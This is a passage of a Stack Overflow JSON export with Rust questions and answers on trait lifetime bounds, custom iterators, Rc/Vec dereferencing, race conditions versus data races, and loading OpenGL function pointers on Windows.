<code>BTree&lt;T&gt;</code> for a type that has a lifetime. My general advice for all lifetime errors involving a generic type parameter or a <code>Self</code> type is: focus on the case when the type is a borrowed type.</p>\n\n<p>The trouble with borrowed types is you can never have a reference with a longer lifetime than the data it refers to. The simplest example of this principle is:</p>\n\n<pre><code>fn f&lt;'a, 'b&gt;() {\n    // error[E0491]: in type `&amp;'a &amp;'b ()`, reference has a longer\n    // lifetime than the data it references\n    let _: &amp;'a &amp;'b ();\n}\n</code></pre>\n\n<p>Rust forces us to guarantee that the data referred to by the reference outlives the reference, in this case <code>'b</code> outlives <code>'a</code>.</p>\n\n<pre><code>fn f&lt;'a, 'b: 'a&gt;() {\n    let _: &amp;'a &amp;'b ();\n}\n</code></pre>\n\n<p>Now let's apply this to your <code>BTree</code> situation by considering what goes wrong if <code>T</code> is a borrowed type like <code>&amp;()</code>. First, looking at the following two methods which you placed in <code>impl&lt;T&gt; BTree&lt;T&gt; for MyBTree&lt;T&gt;</code>. I have written the elided lifetimes explicitly to clarify the discussion.</p>\n\n<pre><code>impl&lt;T&gt; BTree&lt;T&gt; for MyBTree&lt;T&gt; {\n    fn left&lt;'a&gt;(&amp;'a self) -&gt; Option&lt;&amp;'a Self&gt; { /* ... */ }\n    fn value&lt;'a&gt;(&amp;'a self) -&gt; Option&lt;&amp;'a T&gt; { /* ... */ }\n}\n</code></pre>\n\n<p>In order for the caller to invoke <code>left</code>, they <strong>must</strong> know that <code>Self</code> outlives lifetime <code>'a</code>. And in order for the caller to invoke <code>value</code> they <strong>must</strong> know that <code>Self</code> outlives lifetime <code>'a</code> <strong>and</strong> <code>T</code> outlives lifetime <code>'a</code> (in order for <code>&amp;'a T</code> to be a meaningful type, as we saw above). The borrow checker will not let them <strong>call</strong> these methods unless those requirements are met, and so the implementation can assume those requirements are met.</p>\n\n<p>Further, the borrow checker can see that <strong>if</strong> <code>Self</code> outlives <code>'a</code> <strong>then</strong> also <code>T</code> outlives <code>'a</code> because <code>MyBTree&lt;T&gt;</code> contains a value of type <code>T</code>.</p>\n\n<p>This is why there was no problem implementing <code>left</code> and <code>value</code> within <code>impl&lt;T&gt; BTree&lt;T&gt; for MyBTree&lt;T&gt;</code>. The caller and the <code>MyBTree&lt;T&gt;</code> structure together guarantee that everything lives as long as we need.</p>\n\n<p>Now in the case that we had these methods in the <code>BTree&lt;T&gt;</code> trait definition.</p>\n\n<pre><code>trait BTree&lt;T&gt; {\n    fn left&lt;'a&gt;(&amp;'a self) -&gt; Option&lt;&amp;'a Self&gt; { /* ... */ }\n    fn value&lt;'a&gt;(&amp;'a self) -&gt; Option&lt;&amp;'a T&gt; { /* ... */ }\n}\n</code></pre>\n\n<p>Things go wrong here because if the caller invokes <code>left</code> they <strong>must</strong> know that <code>Self</code> outlives <code>'a</code>, but they <strong>have not guaranteed</strong> that <code>T</code> outlives <code>'a</code>. For example they could have <code>T=&amp;'b ()</code> for some totally unrelated shorter lifetime <code>'b</code>. As we saw above, that would make <code>&amp;'a T</code> equal to <code>&amp;'a &amp;'b ()</code> which would not be a legal type.</p>\n\n<p>The reason Rust is happy with <code>value</code> defined in the trait is that the caller guarantees both <code>Self</code> and <code>T</code> outlive the input lifetime <code>'a</code>. The reason Rust is not happy with <code>left</code> defined in the trait is that the caller guarantees only <code>Self</code> outlives <code>'a</code>, not <code>T</code> outlives <code>'a</code> which the implementation assumes.</p>\n\n<blockquote>\n  <p>And how come the compiler complains about the lifetime of T in the methods who <em>ignore</em> the T value -- while it works with the method <code>value</code> which does mention T in its return type?</p>\n</blockquote>\n\n<p>Well the error is not about the return value, it is about the call to <code>all()</code>. Look closely.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0311]: the parameter type `T` may not live long enough\n--&gt; src/lib.rs:6:24\n  |\n6 |             match self.all() {\n  |                        ^^^\n</code></pre>\n\n<p>In order to call <code>all()</code>, the caller is responsible for proving that the input and output types are valid types. But in the case that <code>T</code> is something like <code>&amp;'b ()</code>, this may not be true. The <code>all()</code> would return <code>&amp;'a &amp;'b ()</code> so the borrow checker prevents the call.</p>\n\n<p>We can fix this by making explicit the guarantees that our implementation assumes, in this case that <code>T</code> outlives <code>'a</code>.</p>\n\n<pre><code>trait BTree&lt;T&gt; {\n    fn left&lt;'a&gt;(&amp;'a self) -&gt; Option&lt;&amp;'a Self&gt;\n    where\n        T: 'a,\n    { \n        /* ... */ \n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 1523, "user_id": 1235487, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c586f2d0682c9f919da29b520347a5e?s=128&d=identicon&r=PG", "display_name": "Pierre-Antoine", "link": "https://stackoverflow.com/users/1235487/pierre-antoine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 202, "favorite_count": 1, "accepted_answer_id": 49035172, "answer_count": 1, "score": 11, "last_activity_date": 1519841252, "creation_date": 1519836211, "last_edit_date": 1519837055, "question_id": 49034550, "link": "https://stackoverflow.com/questions/49034550/why-does-a-function-body-compile-in-a-struct-but-not-in-a-trait", "title": "Why does a function body compile in a struct, but not in a trait?", "body": "<p>This code defines a very simple trait for representing binary trees and a struct implementing that trait:</p>\n\n<pre><code>pub trait BTree&lt;T&gt; {\n    fn all(&amp;self) -&gt; Option&lt;(&amp;Self, &amp;Self, &amp;T)&gt;;\n    fn left(&amp;self) -&gt; Option&lt;&amp;Self&gt;;\n    fn right(&amp;self) -&gt; Option&lt;&amp;Self&gt;;\n    fn value(&amp;self) -&gt; Option&lt;&amp;T&gt;;\n}\n\npub struct MyBTree&lt;T&gt; {\n    opt: Option&lt;Box&lt;(MyBTree&lt;T&gt;, MyBTree&lt;T&gt;, T)&gt;&gt;,\n}\n\nimpl&lt;T&gt; BTree&lt;T&gt; for MyBTree&lt;T&gt; {\n    fn all(&amp;self) -&gt; Option&lt;(&amp;Self, &amp;Self, &amp;T)&gt; {\n        match self.opt {\n            None =&gt; None,\n            Some(ref tuple) =&gt; Some((&amp;tuple.0, &amp;tuple.1, &amp;tuple.2)),\n        }\n    }\n\n    fn left(&amp;self) -&gt; Option&lt;&amp;Self&gt; {\n        match self.all() {\n            None =&gt; None,\n            Some((left, _, _)) =&gt; Some(left),\n        }\n    }\n\n    fn right(&amp;self) -&gt; Option&lt;&amp;Self&gt; {\n        match self.all() {\n            None =&gt; None,\n            Some((right, _, _)) =&gt; Some(right),\n        }\n    }\n\n    fn value(&amp;self) -&gt; Option&lt;&amp;T&gt; {\n        match self.all() {\n            None =&gt; None,\n            Some((_, _, value)) =&gt; Some(value),\n        }\n    }\n}\n</code></pre>\n\n<p>The implementations of <code>left</code>, <code>right</code> and <code>value</code> could be moved inside the trait as they only depend on the <code>all</code> method defined by the trait, and not on implementation details.</p>\n\n<p>This works fine with <code>value</code>, but <em>not</em> with <code>left</code> and <code>right</code>. For example, if I try to move the implementation of <code>left</code> in the body of the trait, I get the following compilation error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0311]: the parameter type `T` may not live long enough\n--&gt; src/lib.rs:6:24\n  |\n6 |             match self.all() {\n  |                        ^^^\n  |\n= help: consider adding an explicit lifetime bound for `T`\nnote: the parameter type `T` must be valid for the anonymous lifetime #1 defined on the method body at 5:9...\n--&gt; src/lib.rs:5:9\n  |\n5 | /         fn left(&amp;self) -&gt; Option&lt;&amp;Self&gt; {\n6 | |             match self.all() {\n7 | |                 None =&gt; None,\n8 | |                 Some((left, _, _)) =&gt; Some(left),\n9 | |             }\n10| |         }\n  | |_________^\nnote: ...so that the reference type `&amp;T` does not outlive the data it points at\n--&gt; src/lib.rs:6:24\n  |\n6 |             match self.all() {\n  |\n</code></pre>\n\n<p>Why does this problem occur in the trait but not in the implementation for <code>MyBTree</code>?</p>\n\n<p>Why does the compiler complain about the lifetime of <code>T</code> in the methods who <em>ignore</em> the T value -- while it works with the method <code>value</code>  which <em>does</em> mention T in its return type?</p>\n"}, {"tags": ["for-loop", "rust"], "comments": [{"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 1, "creation_date": 1519827237, "post_id": 49030578, "comment_id": 85067640, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/43823042/are-c-style-for-loops-that-step-by-a-different-amount-each-iteration-possible-in\">Are C style for loops that step by a different amount each iteration possible in Rust?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "is_accepted": true, "score": 5, "last_activity_date": 1519825637, "creation_date": 1519825637, "answer_id": 49031080, "question_id": 49030578, "link": "https://stackoverflow.com/questions/49030578/is-there-a-way-to-do-a-for-loop-that-is-neither-iterative-nor-linear/49031080#49031080", "title": "Is there a way to do a for loop that is neither iterative nor linear?", "body": "<blockquote>\n  <p>can I write a for loop equivalent to this C code:</p>\n</blockquote>\n\n<p>That specifically, yes:</p>\n\n<pre><code>extern crate itertools;\nfor i in itertools::iterate(2, |&amp;i| i*i).take_while(|&amp;i| i &lt;= 128) {\n    // do something\n}\n</code></pre>\n\n<p>But in general, no.  There is no single, <em>direct</em> equivalent to all possible uses of C's <code>for</code> loop.  If there's no way to write it using iterators then yes, you need to use a more general loop form:</p>\n\n<pre><code>{\n    let mut i = 2;\n    while i &lt;= 128 {\n        // do something\n        i = i*i;\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 2, "creation_date": 1519825831, "post_id": 49031126, "comment_id": 85066717, "body": "I mean... <i>yes</i>, but that&#39;s not exactly helping Rust&#39;s reputation for being long-winded.  This is &quot;using the death star to explode the planet to kill a spider&quot; levels of overkill..."}, {"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 3, "creation_date": 1519826501, "post_id": 49031126, "comment_id": 85067142, "body": "<i>sees latest edit</i>  Ok, now you&#39;re doing this on purpose.  :P"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "reply_to_user": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 0, "creation_date": 1519827145, "post_id": 49031126, "comment_id": 85067569, "body": "@DK. I mean, only a little bit ;-). However, as I mention in the linked question, I think the <code>GeneratorIteratorAdapter</code> will be a part of the standard library in <i>some</i> form, leaving the <code>doubling</code> function as &quot;reasonably&quot; small."}], "tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": false, "score": 7, "last_activity_date": 1519826695, "last_edit_date": 1519826695, "creation_date": 1519825767, "answer_id": 49031126, "question_id": 49030578, "link": "https://stackoverflow.com/questions/49030578/is-there-a-way-to-do-a-for-loop-that-is-neither-iterative-nor-linear/49031126#49031126", "title": "Is there a way to do a for loop that is neither iterative nor linear?", "body": "<p>You can <em>always</em> create a custom iterator that does whatever unique sequence you need:</p>\n\n<pre><code>struct Doubling {\n    current: u64,\n    max: u64,\n}\n\nimpl Iterator for Doubling {\n    type Item = u64;\n\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {\n        if self.current &gt; self.max {\n            None\n        } else {\n            let v = Some(self.current);\n            self.current *= 2;\n            v\n        }\n    }\n}\n\nfn main() {\n    let iter = Doubling { current: 2, max: 128 };\n    let values: Vec&lt;_&gt; = iter.collect();\n    println!(\"{:?}\", values);\n}\n</code></pre>\n\n<p>It's important to recognize that this logic (like the original C!) has nasty edge cases when the value is doubled beyond the size of the type.</p>\n\n<hr>\n\n<p>In this <em>particular</em> case, you can also recognize that you have an exponential series:</p>\n\n<pre><code>fn main() {\n    let iter = (1..8).map(|p| 2i32.pow(p));\n    let values: Vec&lt;_&gt; = iter.collect();\n    println!(\"{:?}\", values);\n}\n</code></pre>\n\n<hr>\n\n<p>If you want to get really experimental, check out <a href=\"https://stackoverflow.com/q/16421033/155423\">Lazy sequence generation in Rust</a>. Adapted here:</p>\n\n<pre><code>#![feature(generators, generator_trait, conservative_impl_trait)]\n\nuse std::ops::{Generator, GeneratorState};\n\nfn doubling(mut start: u64, max: u64) -&gt; impl Iterator&lt;Item = u64&gt; {\n    GeneratorIteratorAdapter(move || {\n        while start &lt;= max {\n            yield start;\n            start *= 2;\n        }\n    })\n}\n\nfn main() {\n    let iter = doubling(2, 128);\n    let sum: Vec&lt;_&gt; = iter.collect();\n    println!(\"{:?}\", sum);\n}\n\n/* copy-pasta */\nstruct GeneratorIteratorAdapter&lt;G&gt;(G);\n\nimpl&lt;G&gt; Iterator for GeneratorIteratorAdapter&lt;G&gt;\nwhere\n    G: Generator&lt;Return = ()&gt;,\n{\n    type Item = G::Yield;\n\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {\n        match self.0.resume() {\n            GeneratorState::Yielded(x) =&gt; Some(x),\n            GeneratorState::Complete(_) =&gt; None,\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 8821303, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211086267296084/picture?type=large", "display_name": "Elliot Wasem", "link": "https://stackoverflow.com/users/8821303/elliot-wasem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 238, "favorite_count": 0, "accepted_answer_id": 49031080, "answer_count": 2, "score": 3, "last_activity_date": 1519826695, "creation_date": 1519824002, "last_edit_date": 1519825458, "question_id": 49030578, "link": "https://stackoverflow.com/questions/49030578/is-there-a-way-to-do-a-for-loop-that-is-neither-iterative-nor-linear", "title": "Is there a way to do a for loop that is neither iterative nor linear?", "body": "<p>Can I write a Rust <code>for</code> loop equivalent to this C code:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>for(int i = 2; i &lt;= 128; i=i*i){\n    //do something\n}\n</code></pre>\n\n<p>I'm only seeing things like</p>\n\n<pre><code>for i in 0..128 { /* do something */ }\n</code></pre>\n\n<p>or</p>\n\n<pre><code>let v = vec![0, 1, 2, /* ... */ ];\nfor i in v.iter() { /* do something */ }\n</code></pre>\n\n<p>Should I just use a <code>while</code> loop?</p>\n"}, {"tags": ["rust", "dereference"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 2, "creation_date": 1519815285, "post_id": 49027745, "comment_id": 85059967, "body": "<code>Deref</code>-ception. :)"}], "answers": [{"tags": [], "owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "is_accepted": false, "score": 11, "last_activity_date": 1519817996, "last_edit_date": 1519817996, "creation_date": 1519816517, "answer_id": 49028262, "question_id": 49027745, "link": "https://stackoverflow.com/questions/49027745/dereferencing-rcvect-confusion-in-rust/49028262#49028262", "title": "Dereferencing Rc&lt;Vec&lt;T&gt;&gt; confusion in Rust", "body": "<p>Both, <a href=\"https://doc.rust-lang.org/std/rc/struct.Rc.html\" rel=\"noreferrer\">Rc</a> and <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html\" rel=\"noreferrer\">Vec</a> implements <a href=\"https://doc.rust-lang.org/std/ops/trait.Deref.html\" rel=\"noreferrer\">Deref</a>, whichs <a href=\"https://doc.rust-lang.org/std/ops/trait.Deref.html#tymethod.deref\" rel=\"noreferrer\"><code>deref</code></a>-method is called with the <code>*</code>.</p>\n\n<pre><code>let c = vec![1, 2, 3, 4, 5];\n</code></pre>\n\n<p>creates a <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html\" rel=\"noreferrer\">Vec</a> with the given elements with the <a href=\"https://doc.rust-lang.org/std/macro.vec.html\" rel=\"noreferrer\"><code>vec!</code></a>-macro.</p>\n\n<pre><code>let r = Rc::new(c);\n</code></pre>\n\n<p>creates a <a href=\"https://doc.rust-lang.org/std/rc/struct.Rc.html\" rel=\"noreferrer\">Reference counted Object</a> from the Vector. The Vector is moved into the <a href=\"https://doc.rust-lang.org/std/rc/struct.Rc.html\" rel=\"noreferrer\">RC</a>.</p>\n\n<pre><code>println!(\"{:?}\", (**r)[0]);\n</code></pre>\n\n<p>This one is a bit more tricky: <code>*r</code> <a href=\"https://doc.rust-lang.org/std/rc/struct.Rc.html#impl-Deref\" rel=\"noreferrer\">dereferences</a> the Rc, so we get the underlying Vector. <code>*rc</code> <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html#impl-Deref\" rel=\"noreferrer\">dereferences</a> the Vector as a <a href=\"https://doc.rust-lang.org/std/primitive.slice.html\" rel=\"noreferrer\">slice</a>. <code>slice[0]</code> <a href=\"https://doc.rust-lang.org/std/primitive.slice.html#impl-Index%3CI%3E\" rel=\"noreferrer\">indexes</a> the first element of the slice, which results in the first element <code>1</code>. <code>println!</code> finally prints the result.</p>\n"}, {"tags": [], "owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "is_accepted": true, "score": 8, "last_activity_date": 1519817407, "last_edit_date": 1519817407, "creation_date": 1519816555, "answer_id": 49028276, "question_id": 49027745, "link": "https://stackoverflow.com/questions/49027745/dereferencing-rcvect-confusion-in-rust/49028276#49028276", "title": "Dereferencing Rc&lt;Vec&lt;T&gt;&gt; confusion in Rust", "body": "<p>It might be easier to understand what happens once we build a function prototype around the expression <code>(**r)[0]</code>:</p>\n\n<pre><code>fn foo&lt;T, U&gt;(r: T) -&gt; i32\nwhere\n    T: Deref&lt;Target=U&gt;,\n    U: Deref&lt;Target=[i32]&gt;,\n{\n    (**r)[0]\n}\n</code></pre>\n\n<p><a href=\"https://play.rust-lang.org/?gist=bc1d1c74dd4ac67a718b2c459131a257&amp;version=stable\" rel=\"noreferrer\">Playground</a></p>\n\n<p><code>Rc&lt;T&gt;</code>, as is typical for most smart containers in Rust, implements <a href=\"https://doc.rust-lang.org/stable/std/ops/trait.Deref.html\" rel=\"noreferrer\"><code>Deref</code></a> so that it can be used as an ordinary reference to the underlying value. In turn, <code>Vec&lt;T&gt;</code> implements <code>Deref</code> so that it can be used as a slice (<code>Target = [T]</code>). The explicit dereferencing <code>*</code>, when performed twice, applies the two conversions in sequence.</p>\n\n<p>Of course, usually you wouldn't need to do this, because <code>Vec</code> also implements the <code>Index</code> operator. </p>\n"}], "owner": {"reputation": 3480, "user_id": 2686821, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5dd46afe4f5a75f2667569582b20ac9b?s=128&d=identicon&r=PG&f=1", "display_name": "soupybionics", "link": "https://stackoverflow.com/users/2686821/soupybionics"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1284, "favorite_count": 0, "accepted_answer_id": 49028276, "answer_count": 2, "score": 6, "last_activity_date": 1519823607, "creation_date": 1519814972, "last_edit_date": 1519823607, "question_id": 49027745, "link": "https://stackoverflow.com/questions/49027745/dereferencing-rcvect-confusion-in-rust", "title": "Dereferencing Rc&lt;Vec&lt;T&gt;&gt; confusion in Rust", "body": "<p>Why does the following code work?</p>\n\n<pre><code>use std::rc::Rc;\nfn main () {\n    let c = vec![1, 2, 3, 4, 5];\n    let r = Rc::new(c);\n    println!(\"{:?}\", (**r)[0]);\n}\n</code></pre>\n\n<p>I can understand it working with single deference (<code>println!(\"{:?}\", (*r)[0]);</code>). But not able to understand it working with double-dereference too.</p>\n"}, {"tags": ["rust", "race-condition"], "comments": [{"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1519801644, "post_id": 49023664, "comment_id": 85052234, "body": "Higher level language, or any languages at all really, provide an abstraction of the underlying hardware. The hardware does what it does regardless of how you attempt to cover up anomalies."}], "answers": [{"comments": [{"owner": {"reputation": 10100, "user_id": 619216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c07104de771c3b6f6c30be8f592ef8f7?s=128&d=identicon&r=PG", "display_name": "BurntSushi5", "link": "https://stackoverflow.com/users/619216/burntsushi5"}, "edited": false, "score": 3, "creation_date": 1519818265, "post_id": 49023729, "comment_id": 85061732, "body": "It might be worth briefly mentioning the distinction between race condition (not prevented by Rust) and data race (prevented by Rust)."}, {"owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "reply_to_user": {"reputation": 10100, "user_id": 619216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c07104de771c3b6f6c30be8f592ef8f7?s=128&d=identicon&r=PG", "display_name": "BurntSushi5", "link": "https://stackoverflow.com/users/619216/burntsushi5"}, "edited": false, "score": 2, "creation_date": 1519823787, "post_id": 49023729, "comment_id": 85065256, "body": "@BurntSushi5: I tried something, let me know what you think  of it."}], "tags": [], "owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "is_accepted": true, "score": 14, "last_activity_date": 1519823769, "last_edit_date": 1519823769, "creation_date": 1519801402, "answer_id": 49023729, "question_id": 49023664, "link": "https://stackoverflow.com/questions/49023664/could-software-written-only-in-rust-fully-avoid-race-conditions/49023729#49023729", "title": "Could software written only in Rust fully avoid race conditions?", "body": "<p><strong>No</strong>.</p>\n\n<p>I've seen race conditions in:</p>\n\n<ul>\n<li>filesystem accesses,</li>\n<li>database accesses,</li>\n<li>access to other services.</li>\n</ul>\n\n<p>The environment in which a program evolves in full of data-races, and there's nothing a programming language can do but embrace it.</p>\n\n<hr>\n\n<p>Rust focuses on memory-safety. In the context of multi-threaded programming, this means preventing <em>data races</em>.</p>\n\n<p>A program with no data race can still contain race conditions:</p>\n\n<ul>\n<li>data race: modification of a value while it is being read/written by another thread with no synchronization, the resulting behavior is unpredictable (especially when optimizers are involved),</li>\n<li>race condition: a timing issue on a sequence of events, the resulting behavior is one of a small set of possible behaviors. It can be solved by synchronization, but this is not the only solution.</li>\n</ul>\n\n<p>Race conditions are not memory errors. For Rust, this means they are considered <em>safe</em>, although of course they are still undesirable. They may happen at many different levels: between threads, processes, servers, ...</p>\n"}], "owner": {"reputation": 287, "user_id": 9318873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8dcd87fbb144123c95c613bce1d76998?s=128&d=identicon&r=PG&f=1", "display_name": "Hessnov", "link": "https://stackoverflow.com/users/9318873/hessnov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1174, "favorite_count": 4, "accepted_answer_id": 49023729, "answer_count": 1, "score": 4, "last_activity_date": 1519841515, "creation_date": 1519801153, "last_edit_date": 1519841515, "question_id": 49023664, "link": "https://stackoverflow.com/questions/49023664/could-software-written-only-in-rust-fully-avoid-race-conditions", "title": "Could software written only in Rust fully avoid race conditions?", "body": "<p>Wikipedia <a href=\"https://en.wikipedia.org/wiki/Race_condition\" rel=\"nofollow noreferrer\">defines a <em>race condition</em></a> as:</p>\n\n<blockquote>\n  <p>A race condition or race hazard is the behavior of an electronics, software, or other system where the output is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when events do not happen in the order the programmer intended.</p>\n</blockquote>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Rust_(programming_language)\" rel=\"nofollow noreferrer\">Rust is</a> a:</p>\n\n<blockquote>\n  <p>safe, concurrent, practical language</p>\n</blockquote>\n\n<p>If we create software that is 100% Rust, can we avoid race conditions? Why or why not? </p>\n"}, {"tags": ["winapi", "opengl", "rust"], "comments": [{"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "reply_to_user": {"reputation": 30603, "user_id": 27491, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/48cc12ad73f816bc5b115a9ca6965328?s=128&d=identicon&r=PG", "display_name": "Chris Becke", "link": "https://stackoverflow.com/users/27491/chris-becke"}, "edited": false, "score": 1, "creation_date": 1519801397, "post_id": 49021466, "comment_id": 85052119, "body": "@ChrisBecke The language choice here is unlikely to be the problem.  There&#39;s no cause to be so dismissive."}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1519803800, "post_id": 49021466, "comment_id": 85053283, "body": "Your message loop implementation is less than ideal. It handles at most a single message in between rendering a frame. This is not an issue now, but once rendering a frame becomes an expensive operation, you&#39;ll observe sluggish application response, as messages are generated faster than they are dispatched."}], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 8817416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01353082a8b44feb14ce9925da93df17?s=128&d=identicon&r=PG&f=1", "display_name": "John N.", "link": "https://stackoverflow.com/users/8817416/john-n"}, "edited": false, "score": 0, "creation_date": 1519933514, "post_id": 49034511, "comment_id": 85119675, "body": "Thanks for the info. After having thoroughly read through the materials, I understand that I was mixing up what I&#39;ve learned in the past with OpenGL 2.x tutorials with the version that gl_generator defaults to, which is version 4.3. Also, the reason that some load functions successfully loaded and others did not were because GetProcAddress is necessary for certain functions which originate from OpenGL &lt;= 1.1, as it is for Viewport, ClearColor, GetError, and Clear. But functions that were introduced in later versions, such as DrawArrays, need wglGetProcAddress. I&#39;ll adjust my code accordingly."}], "tags": [], "owner": {"reputation": 6058, "user_id": 3871028, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dfbe44ff5c56628e85683c8918602c96?s=128&d=identicon&r=PG&f=1", "display_name": "Ripi2", "link": "https://stackoverflow.com/users/3871028/ripi2"}, "is_accepted": true, "score": 2, "last_activity_date": 1519836055, "creation_date": 1519836055, "answer_id": 49034511, "question_id": 49021466, "link": "https://stackoverflow.com/questions/49021466/win32-opengl-window-in-rust-unable-to-load-certain-function-pointers/49034511#49034511", "title": "Win32 OpenGL Window in rust: unable to load certain function pointers", "body": "<p>Read the <a href=\"https://www.khronos.org/opengl/wiki/Load_OpenGL_Functions\" rel=\"nofollow noreferrer\">wiki</a> and <a href=\"https://www.khronos.org/opengl/wiki/Creating_an_OpenGL_Context_(WGL)\" rel=\"nofollow noreferrer\">this too</a> about loading OGL pointers.</p>\n\n<p><p>Briefly, for Windows:</p>\n\n<ul>\n<li><code>GetProcAddress</code> is only valid for OpenGL &lt;= 1.1</li>\n<li><code>wglGetProcAddress</code> is only valid for OpenGL > 1.1</li>\n</ul>\n\n<p><p>Also, the use of shaders requires OpenGL >= 2.0. Better go with OGL >= 3.2 <em>Core Profile</em>. For this context:</p>\n\n<ul>\n<li>You need a proper context for OpenGL >= 3.0, which is created with the use of <code>wglCreateContextAttribsARB</code>.</li>\n<li>You need a valid and current context to get the pointer to <code>wglCreateContextAttribsARB</code> itself by using <code>wglGetProcAddress</code>.</li>\n<li>This context may be temporary. It can be created with <code>wglCreateContext</code>. You can delete it after you got that pointer; and the create the \"real\" context.</li>\n</ul>\n\n<p>.</p>\n"}], "owner": {"reputation": 25, "user_id": 8817416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01353082a8b44feb14ce9925da93df17?s=128&d=identicon&r=PG&f=1", "display_name": "John N.", "link": "https://stackoverflow.com/users/8817416/john-n"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, 